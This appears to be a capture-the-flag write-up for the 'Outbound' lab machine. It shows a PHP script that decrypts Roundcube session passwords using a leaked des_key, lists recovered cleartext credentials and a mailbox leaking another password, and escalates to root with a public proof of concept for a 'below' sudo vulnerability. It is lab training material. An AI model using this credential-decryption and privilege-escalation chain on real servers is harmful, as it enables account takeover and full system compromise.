dGVtcHxiOjE7bGFuZ3VhZ2V8czo1OiJlbl9VUyI7dGFza3xzOjU6ImxvZ2luIjtza2luX2NvbmZpZ3xhOjc6e3M6MTc6InN1cHBvcnRlZF9sYXlvdXRzIjthOjE6e2k6MDtzOjEwOiJ3aWRlc2NyZWVuIjt9czoyMjoianF1ZXJ5X3VpX2NvbG9yc190aGVtZSI7czo5OiJib290c3RyYXAiO3M6MTg6ImVtYmVkX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTk6ImVkaXRvcl9jc3NfbG9jYXRpb24iO3M6MTc6Ii9zdHlsZXMvZW1iZWQuY3NzIjtzOjE3OiJkYXJrX21vZGVfc3VwcG9ydCI7YjoxO3M6MjY6Im1lZGlhX2Jyb3dzZXJfY3NzX2xvY2F0aW9uIjtzOjQ6Im5vbmUiO3M6MjE6ImFkZGl0aW9uYWxfbG9nb190eXBlcyI7YTozOntpOjA7czo0OiJkYXJrIjtpOjE7czo1OiJzbWFsbCI7aToyO3M6MTA6InNtYWxsLWRhcmsiO319cmVxdWVzdF90b2tlbnxzOjMyOiJERW0wdkZHeUVaV1N2YjVPVGdVQVNPUWtnSGdtQlAyaCI7:temp|b:1;language|s:5:"en_US";task|s:5:"login";skin_config|a:7:{s:17:"supported_layouts";a:1:{i:0;s:10:"widescreen";}s:22:"jquery_ui_colors_theme";s:9:"bootstrap";s:18:"embed_css_location";s:17:"/styles/embed.css";s:19:"editor_css_location";s:17:"/styles/embed.css";s:17:"dark_mode_support";b:1;s:26:"media_browser_css_location";s:4:"none";s:21:"additional_logo_types";a:3:{i:0;s:4:"dark";i:1;s:5:"small";i:2;s:10:"small-dark";}}request_token|s:32:"DEm0vFGyEZWSvb5OTgUASOQkgHgmBP2h";
```

We cannot "crack" this like a hash. To recover the plaintext password, you would need:
- The `des_key` from Roundcube’s configuration (`config.inc.php`)
- Use Roundcube's internal decryption functions

Looking again into the config.inc.php:

```php
<?php

/*
 +-----------------------------------------------------------------------+
 | Local configuration for the Roundcube Webmail installation.           |
 |                                                                       |
 | This is a sample configuration file only containing the minimum       |
 | setup required for a functional installation. Copy more options       |
 | from defaults.inc.php to this file to override the defaults.          |
 |                                                                       |
 | This file is part of the Roundcube Webmail client                     |
 | Copyright (C) The Roundcube Dev Team                                  |
 |                                L7Rv00A8TuwJAr67kITxxcSgnIk25Am/                                       |
 | Licensed under the GNU General Public License version 3 or            |
 | any later version with exceptions for skins & plugins.                |
 | See the README file for a full license statement.                     |
 +-----------------------------------------------------------------------+
*/

$config = [];

// Database connection string (DSN) for read+write operations
// Format (compatible with PEAR MDB2): db_provider://user:password@host/database
// Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle
// For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php
// NOTE: for SQLite use absolute path (Linux): 'sqlite:////full/path/to/sqlite.db?mode=0646'
//       or (Windows): 'sqlite:///C:/full/path/to/sqlite.db'
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';

// IMAP host chosen to perform the log-in.
// See defaults.inc.php for the option description.
$config['imap_host'] = 'localhost:143';

// SMTP server host (for sending mails).
// See defaults.inc.php for the option description.
$config['smtp_host'] = 'localhost:587';

// SMTP username (if required) if you use %u as the username Roundcube
// will use the current username for login
$config['smtp_user'] = '%u';

// SMTP password (if required) if you use %p as the password Roundcube
// will use the current user's password for login
$config['smtp_pass'] = '%p';

// provide an URL where a user can get support for this Roundcube installation
// PLEASE DO NOT LINK TO THE ROUNDCUBE.NET WEBSITE HERE!
$config['support_url'] = '';

// Name your service. This is displayed on the login screen and in the window title
$config['product_name'] = 'Roundcube Webmail';

// This key is used to encrypt the users imap password which is stored
// in the session record. For the default cipher method it must be
// exactly 24 characters long.
// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';

// List of active plugins (in plugins/ directory)
$config['plugins'] = [
    'archive',
    'zipdownload',
];

// skin name: folder from skins/
$config['skin'] = 'elastic';
$config['default_host'] = 'localhost';
$config['smtp_server'] = 'localhost';
```

the des key is: `rcmail-!24ByteDESkey*Str`

Looked online into how roundcube encrypts its strings: https://raw.githubusercontent.com/roundcube/roundcubemail/refs/heads/master/program/lib/Roundcube/rcube.php
and created a php script to take in ciphers and  decrypt:

```php
<?php

/**

* Roundcube Password Decryption Script

* Based on the modern OpenSSL implementation from Roundcube

*/

  

class RoundcubeDecryptor {

private $des_key;

public function __construct($des_key) {

$this->des_key = $des_key;

}

/**

* Get crypto key - simplified version

*/

private function get_crypto_key($key_name = 'des_key') {

return $this->des_key;

}

/**

* Get crypto method - Roundcube typically uses AES-256-CBC or similar

*/

private function get_crypto_method() {

// Try common methods that Roundcube might use

$methods = ['aes-256-cbc', 'aes-128-cbc', 'des-ede3-cbc'];

foreach ($methods as $method) {

if (in_array($method, openssl_get_cipher_methods())) {

return $method;

}

}

return 'aes-256-cbc'; // fallback

}

/**

* Decrypt a string

*

* @param string $cipher Encrypted text

* @param string $key Encryption key to retrieve from the configuration, defaults to 'des_key'

* @param bool $base64 Whether or not input is base64-encoded

*

* @return string|false Decrypted text, false on error

*/

public function decrypt($cipher, $key = 'des_key', $base64 = true)

{

// @phpstan-ignore-next-line

if (!is_string($cipher) || !strlen($cipher)) {

return false;

}

  

if ($base64) {

$cipher = base64_decode($cipher, true);

if ($cipher === false) {

return false;

}

}

  

$ckey = $this->get_crypto_key($key);

$method = $this->get_crypto_method();

$iv_size = openssl_cipher_iv_length($method);

$tag = null;

  

if (preg_match('/^##(.{16})##/s', $cipher, $matches)) {

$tag = $matches[1];

$cipher = substr($cipher, strlen($matches[0]));

}

  

$iv = substr($cipher, 0, $iv_size);

  

// session corruption? (#1485970)

if (strlen($iv) < $iv_size) {

return false;

}

  

$cipher = substr($cipher, $iv_size);

$clear = openssl_decrypt($cipher, $method, $ckey, OPENSSL_RAW_DATA, $iv, $tag);

  

return $clear;

}

/**

* Try multiple decryption methods

*/

public function decrypt_with_fallback($cipher, $key = 'des_key', $base64 = true) {

$methods = [

'aes-256-cbc',

'aes-128-cbc',

'des-ede3-cbc', // 3DES

'des-cbc',

'aes-256-ecb',

'des-ede3-ecb'

];

if ($base64) {

$cipher_data = base64_decode($cipher, true);

if ($cipher_data === false) {

return false;

}

} else {

$cipher_data = $cipher;

}

$ckey = $this->get_crypto_key($key);

foreach ($methods as $method) {

if (!in_array($method, openssl_get_cipher_methods())) {

continue;

}

echo "Trying method: $method\n";

$iv_size = openssl_cipher_iv_length($method);

if (strlen($cipher_data) < $iv_size) {

echo " Cipher too short for IV size ($iv_size)\n";

continue;

}

$iv = substr($cipher_data, 0, $iv_size);

$cipher_part = substr($cipher_data, $iv_size);

echo " IV: " . bin2hex($iv) . "\n";

echo " Cipher: " . bin2hex($cipher_part) . "\n";

// Prepare key for the method

$key_len = $this->get_key_length($method);

if (strlen($ckey) < $key_len) {

$prepared_key = str_pad($ckey, $key_len, "\0");

} else {

$prepared_key = substr($ckey, 0, $key_len);

}

echo " Key length: " . strlen($prepared_key) . " (required: $key_len)\n";

$clear = openssl_decrypt($cipher_part, $method, $prepared_key, OPENSSL_RAW_DATA, $iv);

if ($clear !== false) {

echo " Raw result: " . bin2hex($clear) . "\n";

echo " Raw text: '" . $clear . "'\n";

// Try different cleanup methods

$methods = [

'original' => rtrim($clear, "\0"),

'no_canary' => substr(rtrim($clear, "\0"), 0, -1),

'trim_padding' => $this->remove_pkcs7_padding($clear),

'just_trim_nulls' => rtrim($clear, "\0"),

];

foreach ($methods as $method_name => $cleaned) {

echo " Method '$method_name': '$cleaned' (len: " . strlen($cleaned) . ")\n";

}

// Return the best candidate (original without just null trimming)

$best_candidate = rtrim($clear, "\0");

if (ctype_print($best_candidate) && strlen($best_candidate) > 0) {

echo " ✓ SUCCESS with $method!\n";

return $best_candidate;

}

} else {

echo " ✗ Failed\n";

}

echo "\n";

}

return false;

}

private function get_key_length($method) {

$key_lengths = [

'aes-256-cbc' => 32,

'aes-128-cbc' => 16,

'des-ede3-cbc' => 24,

'des-cbc' => 8,

'aes-256-ecb' => 32,

'des-ede3-ecb' => 24

];

return $key_lengths[$method] ?? 32;

}

private function remove_pkcs7_padding($data) {

$pad_len = ord($data[strlen($data) - 1]);

if ($pad_len > 0 && $pad_len <= 8 && $pad_len <= strlen($data)) {

// Check if it's valid PKCS7 padding

$is_valid = true;

for ($i = 0; $i < $pad_len; $i++) {

if (ord($data[strlen($data) - 1 - $i]) !== $pad_len) {

$is_valid = false;

break;

}

}

if ($is_valid) {

return substr($data, 0, -$pad_len);

}

}

return $data;

}

}

  

// Main execution

$des_key = "rcmail-!24ByteDESkey*Str";

$encrypted_passwords = [

"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/",

"nwm6jp388hv2Qlmpws7lCd04yn4fP0LP",
"bnJO0pWKqfzgzeQYUKzKuc1I2s9drWYb"

];

  

echo "Roundcube Password Decryption (PHP)\n";

echo str_repeat("=", 40) . "\n";

echo "DES Key: $des_key\n\n";

  

$decryptor = new RoundcubeDecryptor($des_key);

$results = [];

  

foreach ($encrypted_passwords as $i => $encrypted) {

$num = $i + 1;

echo "--- Trying encrypted password #$num: $encrypted ---\n";

$result = $decryptor->decrypt_with_fallback($encrypted);

if ($result !== false) {

echo "Decrypted: '$result'\n";

$results[$encrypted] = $result;

} else {

echo "✗ All decryption methods failed\n";

$results[$encrypted] = "FAILED";

}

echo "\n";

}

  

echo str_repeat("=", 60) . "\n";

echo "CIPHER -> CLEARTEXT MAPPINGS:\n";

echo str_repeat("=", 60) . "\n";

foreach ($results as $cipher => $cleartext) {

echo "Cipher: $cipher\n";

echo "Cleartext: $cleartext\n";

echo str_repeat("-", 60) . "\n";

}

?>
```

```shell
Cipher:    L7Rv00A8TuwJAr67kITxxcSgnIk25Am/
Cleartext: 595mO8DmwGeD
```

SO now we have the password of jacob, but we cannot ssh yet

```shell
su jacob
Password: 595mO8DmwGeD
cd ~
ls 
mail
cd mail
ls
INBOX
Trash
cd INBOX
ls
jacob
ls -la  
total 20
drwxrwx--- 3 jacob jacob 4096 Jul  9 12:41 .
drwx------ 1 jacob jacob 4096 Jul  9 12:41 ..
drwxrwx--- 3 jacob jacob 4096 Jul  9 12:41 .imap
-rw-rw---- 1 jacob jacob 1799 Jul  9 12:41 jacob
cat jacob 
From tyler@outbound.htb  Sat Jun 07 14:00:58 2025
Return-Path: <tyler@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1000)
        id B32C410248D; Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
To: jacob@outbound.htb
Subject: Important Update
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250607140058.B32C410248D@outbound.htb>
Date: Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
From: tyler@outbound.htb
X-IMAPbase: 1749304753 0000000002
X-UID: 1
Status: 
X-Keywords:                                                                       
Content-Length: 233

Due to the recent change of policies your password has been changed.

Please use the following credentials to log into your account: gY4Wr3a1evp4

Remember to change your password when you next log into your account.

Thanks!

Tyler

From mel@outbound.htb  Sun Jun 08 12:09:45 2025
Return-Path: <mel@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1002)
        id 1487E22C; Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
To: jacob@outbound.htb
Subject: Unexpected Resource Consumption
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250608120945.1487E22C@outbound.htb>
Date: Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
From: mel@outbound.htb
X-UID: 2
Status: 
X-Keywords:                                                                       
Content-Length: 261

We have been experiencing high resource consumption on our main server.
For now we have enabled resource monitoring with Below and have granted you privileges to inspect the the logs.
Please inform us immediately if you notice any irregularities.

Thanks!

Mel
```

Run linpeas again because I don't want to waste time looking in directories and searching manually

```shel
pwd
/home/jacob/mail/.imap/INBOX
cd ../..
ls
INBOX
Trash
ls
INBOX
Trash
ls -la
total 36
drwx------ 1 jacob jacob 4096 Jul  9 12:41 .
drwxr-x--- 1 jacob jacob 4096 Aug 14 08:32 ..
drwx------ 1 jacob jacob 4096 Jul  9 12:41 .imap
-rw------- 1 jacob jacob   11 Jun  7 13:59 .subscriptions
drwxrwx--- 3 jacob jacob 4096 Jul  9 12:41 INBOX
-rw------- 1 jacob jacob  528 Jun  7 13:59 Trash
cd INBOX
ls -la
total 20
drwxrwx--- 3 jacob jacob 4096 Jul  9 12:41 .
drwx------ 1 jacob jacob 4096 Jul  9 12:41 ..
drwxrwx--- 3 jacob jacob 4096 Jul  9 12:41 .imap
-rw-rw---- 1 jacob jacob 1799 Jul  9 12:41 jacob
cat jacob
From tyler@outbound.htb  Sat Jun 07 14:00:58 2025
Return-Path: <tyler@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1000)
        id B32C410248D; Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
To: jacob@outbound.htb
Subject: Important Update
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250607140058.B32C410248D@outbound.htb>
Date: Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
From: tyler@outbound.htb
X-IMAPbase: 1749304753 0000000002
X-UID: 1
Status: 
X-Keywords:                                                                       
Content-Length: 233

Due to the recent change of policies your password has been changed.

Please use the following credentials to log into your account: gY4Wr3a1evp4

Remember to change your password when you next log into your account.

Thanks!

Tyler

From mel@outbound.htb  Sun Jun 08 12:09:45 2025
Return-Path: <mel@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1002)
        id 1487E22C; Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
To: jacob@outbound.htb
Subject: Unexpected Resource Consumption
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250608120945.1487E22C@outbound.htb>
Date: Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
From: mel@outbound.htb
X-UID: 2
Status: 
X-Keywords:                                                                       
Content-Length: 261

We have been experiencing high resource consumption on our main server.
For now we have enabled resource monitoring with Below and have granted you privileges to inspect the the logs.
Please inform us immediately if you notice any irregularities.

Thanks!

Mel
```

NOw we ssh eith jacob:gY4Wr3a1evp4

```shell
sudo -l
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
jacob@outbound:~$ 

```

when running sudo below live, and then :help

![outbound-1](/images/outbound/Pasted image 20250814120712.png)

this version is vulnerable to https://www.wiz.io/vulnerability-database/cve/cve-2025-27591

then found this poc: https://github.com/incommatose/CVE-2025-27591-PoC/blob/main/poc.sh

and ran it twice

```shell
evil@outbound:/home/jacob# cd /root
evil@outbound:~# whoami
root
evil@outbound:~# ls
root.txt
evil@outbound:~# cat root.txt
a2f1d2d18a170c7ca376f53887edbfe4
evil@outbound:~# 

```
